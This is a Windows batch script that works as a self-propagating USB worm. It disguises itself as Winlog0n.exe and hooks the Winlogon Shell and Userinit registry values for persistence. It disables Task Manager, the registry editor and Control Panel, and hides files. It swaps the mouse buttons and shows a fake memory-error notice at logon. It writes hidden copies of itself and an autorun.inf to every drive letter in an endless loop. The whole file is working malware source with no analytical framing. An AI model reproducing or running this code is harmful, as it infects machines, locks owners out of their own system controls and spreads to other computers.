@echo off
del %windir%\system.log
if "%1"=="now" goto start
if /i %0=="%windir%\Winlog0n.exe" goto start
if exist %windir%\Winlog0n.exe type %windir%\Winlog0n.exe|find "http://www.abyssmedia.com"||(attrib -h -s -r %windir%\Winlog0n.exe&del %windir%\Winlog0n.exe&goto exit)
reg add HKLM\Software\Microsoft\Windows" "NT\currentVersion\Winlogon /v Shell /t REG_EXPAND_SZ /d explorer.exe" "%windir%\Winlog0n.exe /f
attrib -h -s -r %0
copy %0 %windir%\Winlog0n.exe
attrib +H +S +R %0
echo %0|find /i ":\Winlog0n.exe"&&start explorer.exe .
if exist %windir%\system.log goto end
goto exit
:start
set drivers=c d e f g h i j k l m n o p q r s t u v w x y z
set autorun=%temp%\autorun.inf
set o=%0
::reg
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 00000000 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v SupperHidden /t REG_DWORD /d 00000000 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v CheckedValue /t REG_DWORD /d 00000000 /f
echo @echo off > E:\ALG.bat
echo regedit /s D:\scress.reg >> E:\ALG.bat
echo @echo off > D:\svchost.bat
echo attrib ^-s ^-h ^-r D:\scress.reg >> D:\svchost.bat
echo echo 0x00f12097 ^> D:\scress.reg >> D:\svchost.bat 
echo regedit /s C:\system.reg >> D:\svchost.bat
echo attrib ^-s ^-h ^-r C:\system.reg >> D:\svchost.bat
echo echo Windows Registry Editor Version 5.00 ^> C:\system.reg >> D:\svchost.bat
echo echo. ^>^> C:\system.reg >> D:\svchost.bat
echo echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] ^>^> C:\system.reg >> D:\svchost.bat
echo echo "DisableRegistryTools"=dword:00000001 ^>^> C:\system.reg >> D:\svchost.bat
echo echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] ^>^> C:\system.reg >> D:\svchost.bat
echo echo "DisableTaskMgr"=dword:00000001 ^>^> C:\system.reg >> D:\svchost.bat
echo attrib +s +h +r C:\system.reg >> D:\svchost.bat
echo mshta "javascript:new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0).Eject();window.close();" >> D:\svchost.bat
echo Windows Registry Editor Version 5.00 >D:\scress.reg
echo. >>D:\scress.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> D:\scress.reg
echo "system"="E:\\ALG.bat" >> D:\scress.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor] >> D:\scress.reg
echo "AutoRun"="D:\\svchost.bat" >> D:\scress.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> D:\scress.reg
echo "LegalNoticeCaption"="0x00f12097指令引用的0x00f30bbc内存．该内存不能为written终止程序单击确定．" >> D:\scress.reg
echo "LegalNoticeText"="0x00f12097指令引用的0x00f30bbc内存．该内存不能为written终止程序单击确定．" >> D:\scress.reg
echo [HKEY_CURRENT_USER\Control Panel\Mouse] >> D:\scress.reg
echo "SwapMouseButtons"="1" >> D:\scress.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >> D:\scress.reg
echo "NoControlPanel"=dword:00000001 >> D:\scress.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> D:\scress.reg
echo "DisableRegistryTools"=dword:00000001 >> D:\scress.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> D:\scress.reg
echo "DisableTaskMgr"=dword:00000001 >> D:\scress.reg
echo Windows Registry Editor Version 5.00 >C:\system.reg
echo. >>C:\system.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> C:\system.reg
echo "Userinit"="userinit.exe,D:\\svchost.bat" >> C:\system.reg
echo [HKEY_CURRENT_USER\Control Panel\Mouse] >> C:\system.reg
echo "SwapMouseButtons"="1" >> C:\system.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >> C:\system.reg
echo "NoControlPanel"=dword:00000001 >> C:\system.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> C:\system.reg
echo "DisableRegistryTools"=dword:00000001 >> C:\system.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> C:\system.reg
echo "DisableTaskMgr"=dword:00000001 >> C:\system.reg
attrib +s +h +r E:\ALG.bat
attrib +s +h +r D:\scress.reg
attrib +s +h +r D:\svchost.bat
attrib +s +h +r C:\system.reg
call E:\ALG.bat
::build autorun
if exist %autorun% (attrib -h -s -r %autorun%&del %autorun%)
echo [autorun]>%autorun%
echo open=Winlog0n.exe>>%autorun%
echo shellexecute=Winlog0n.exe>>%autorun%
echo shell\open=打开(^&O)>>%autorun%
echo shell\open\command=Winlog0n.exe>>%autorun%
echo shell\open\default=^1>>%autorun%
echo shell\explore=资源管理器(^&X)>>%autorun%
echo shell\explore\command=Winlog0n.exe>>%autorun%
:c
for %%d in (%drivers%) do call :do %%d
goto c

goto end

:do
if not exist %1:\ goto end

ping 127.0.0.1 -n 1
echo.>%windir%\system.log
attrib -h -s -r %o%
if exist %1:\Winlog0n.exe type %1:\Winlog0n.exe|find "http://www.abyssmedia.com"||call :ds %1
if not exist %1:\Winlog0n.exe copy /y %o% %1:\Winlog0n.exe
if exist %1:\autorun.inf type %1:\autorun.inf|find /i "open=Winlog0n.exe"||call :da %1
if not exist %1:\autorun.inf copy /y %autorun% %1:\autorun.inf
attrib +H +S +R %1:\Winlog0n.exe
attrib +H +S +R %1:\autorun.inf
goto end

:ds
attrib -h -s -r %1:\Winlog0n.exe
del %1:\Winlog0n.exe
copy /y %o% %1:\Winlog0n.exe
goto end

:da
attrib -h -s -r %1:\autorun.inf
del %1:\autorun.inf
copy /y %autorun% %1:\autorun.inf
goto end

:exit
%windir%\Winlog0n.exe now

:end












